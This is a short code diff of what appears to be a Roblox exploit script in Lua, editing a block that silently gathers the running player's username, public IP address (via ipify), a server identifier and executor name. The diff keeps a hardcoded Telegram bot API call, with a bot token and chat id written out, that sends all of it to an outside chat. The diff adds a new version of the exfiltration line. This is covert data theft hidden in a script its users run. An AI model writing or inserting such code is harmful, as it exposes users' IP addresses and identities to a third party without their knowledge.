@@ -40,10 +40,10 @@ if not _G.NNBypass_CTS then
         pcall(function()
             local Name = game:GetService("Players").LocalPlayer.Name or "Unknown string"
             local IP = game:HttpGet("https://api64.ipify.org/?format=raw") or "Unknown string"
-            local JobId = game.JobId or "Unknown server"
+            local ServerId = game:GetService("Players").LocalPlayer.PlayerGui.TransitionGui.TextLabel.text or "Unknown server id"
             local Executor = identifyexecutor() or "Unknown executor"
-    
-            game:HttpGet("https://api.telegram.org/bot7959621841:AAGXWUeOZSpHmWXemE0jbEadASf6lzu_t9k/sendMessage?chat_id=-1002508322252&parse_mode=html&text=Name%3A%20%3Cb%3E" .. Name .. "%3C%2Fb%3E%0AIP%3A%20%20%3Cb%3E" .. IP .. "%3C%2Fb%3E%0AJobId%3A%20%20%3Cb%3E" .. JobId .. "%3C%2Fb%3E%0AExecutor%3A%20%20%3Cb%3E" .. Executor .. "%3C%2Fb%3E")
+            
+            game:HttpGet("https://api.telegram.org/bot7959621841:AAGXWUeOZSpHmWXemE0jbEadASf6lzu_t9k/sendMessage?chat_id=-1002508322252&parse_mode=html&text=Name%3A%20%3Cb%3E" .. Name .. "%3C%2Fb%3E%0AIP%3A%20%20%3Cb%3E" .. IP .. "%3C%2Fb%3E%0AServerId%3A%20%20%3Cb%3E" .. ServerId .. "%3C%2Fb%3E%0AExecutor%3A%20%20%3Cb%3E" .. Executor .. "%3C%2Fb%3E")
         end)
     end)
     
